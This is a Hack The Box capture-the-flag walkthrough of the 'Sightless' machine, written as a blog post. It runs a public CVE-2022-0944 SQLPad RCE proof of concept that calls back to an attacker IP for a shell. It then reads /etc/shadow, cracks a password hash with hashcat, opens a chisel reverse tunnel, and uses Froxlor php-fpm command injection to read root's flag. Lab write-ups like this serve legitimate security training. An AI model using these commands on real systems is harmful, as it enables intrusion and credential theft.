---
title: "Sightless Walkthrough(Hack The Box)"
date: 2025-04-03
draft: false
description: "A short Walkthrough for the box Sightless"
tags: ["Easy", "Linux", "Hack The Box", "Hacking", "Web", "Walkthrough"]
 
---
## Reconnaissance & Enumeration
- Network scan reveals three open ports
![Pasted image 20241221001932.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221001932.png?raw=true)
- Which are `FTP`, `SSH`, `http(80)`. Port `21(FTP)` is very unusual here. 
![three](https://media1.tenor.com/m/zZvOQkS9VysAAAAC/it%E2%80%99s-nice-it%E2%80%99s-different.gif)
- Initial Enumeration reveals that the page uses `nginx/1.18.0`
- Port `80` had a Slightless Titled page, while scrolling through I found a button which redirected to `sqlpad.sightless.htb`. It's a different domain so I quickly added it to my hosts file and visited it.
- Found a RCE vulnerability from google search: [POC](https://github.com/shhrew/CVE-2022-0944.git)

{{< badge >}} CVE-2022-0944 {{< /badge >}}
Template injection in connection test endpoint leads to RCE in GitHub repository sqlpad/sqlpad prior to 6.10.1.

## Exploitation
- First I cloned this [repo](https://github.com/shhrew/CVE-2022-0944) and then I installed all required packages.
```bash
pip3 install -r requirements.txt
```
- Then I execurted the POC and eventually got the shell
```bash
python3 main.py http://sqlpad.sightless.htb/ 10.10.14.12 6001
```
- There was a sqlite file in the current working directory but, there wasn't any way to transfer it to our machine cause no versions of python found om the system.
- Then I got to know that this is a docker image.
![Pasted image 20241221022335.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221022335.png?raw=true)
- Cause it is weird to have this directory here.
- Anyway from `/etc/passwd` I got know about the two users with bash permissions
![Pasted image 20241221022519.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221022519.png?raw=true)
- From shadow I got the hash of user michael for cracking. Ignore the root hash i am pretty sure it would be a waste of time.
![Pasted image 20241221022725.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221022725.png?raw=true)
- After finding the module, I cracked it with my goto tool
```bash
 hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```
- then I logged in via SSH
- Got {{< keyword >}} User flag {{< /keyword >}}
![Pasted image 20241221023004.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221023004.png?raw=true)
![so-far-so-good](https://media1.tenor.com/m/Ej4XZ8-ThvMAAAAC/positive-bear.gif)

## Privilege Escalation
- While doing post-enumeration I found some interesting local ports using `ss -tunlp` 
- Too many ports don't ya think. Kinda sus if you ask me
![Pasted image 20241221023121.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221023121.png?raw=true)
![sus](https://media1.tenor.com/m/RNVIdsfRXz0AAAAd/hamstermert.gif)
- So I decided to forward all the weird looking ports to my machine
- On my machine
```bash
chisel server -p 7001 --reverse
```
- On the target machine
```bash
./chisel client 10.10.14.12:7001 R:3306:localhost:3306 R:44771:localhost:44771 R:8080:localhost:8080 R:43047:localhost:43047 R:41049:localhost:41049 R:3000:localhost:3000 R:33060:localhost:33060
```
- Not gonna lie that's a lot of ports
- It seems that port `8080` is running `Froxlor`, which required credentials to login
{{< details summary="What is Froxlor" >}} The server administration software for your needs. Developed by experienced server administrators, this panel simplifies the effort of managing your hosting platform. {{< /details >}}
- All the remaining ports seems to be suspicious cause most are non-http ones
- Some of the ports are using chrome debugger internally to do some tasks.
- So I opened chrome and navigated to `chrome://inspect/#devices` and added all the forwarded ports using configure.
![Pasted image 20241221023839.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221023839.png?raw=true)
- Got some hits. I clicked inspect and saw it automatically logging into Froxlor with credentials.
- From the Network tab, I auth request I saw the credentials in plaintext.
![Pasted image 20241221024137.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221024137.png?raw=true)
- Used those creds and got into Froxlor
- While hanging around, I discovered an potential endpoint that could lead to command injection
![Pasted image 20241221024348.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221024348.png?raw=true)
- Created a New PHP version from PHP-FPM versions
- In the php-fpm restart command I filled it with `cp /root/root.txt /home`
- Then went to settings and then restarted the php-fpm
- After 3-5 min I got the file in the home directory but we need permissions so again using the same method I modified the command to `chmod 777 /home/root.txt` This will change permissions.
![Pasted image 20241221024823.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221024823.png?raw=true)
- Got the {{< keyword >}} User flag {{< /keyword >}} Then I realized that from the start I should've changed permissions for root directory itself
![Pasted image 20241221024851.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221024851.png?raw=true)

{{< typeit >}} I hope you liked my walkthrough if you do please share it with your connections. That's it see you later {{< /typeit >}}

![see-ya](https://media1.tenor.com/m/DF0rzVHsu14AAAAC/xranz45-xranz54.gif)
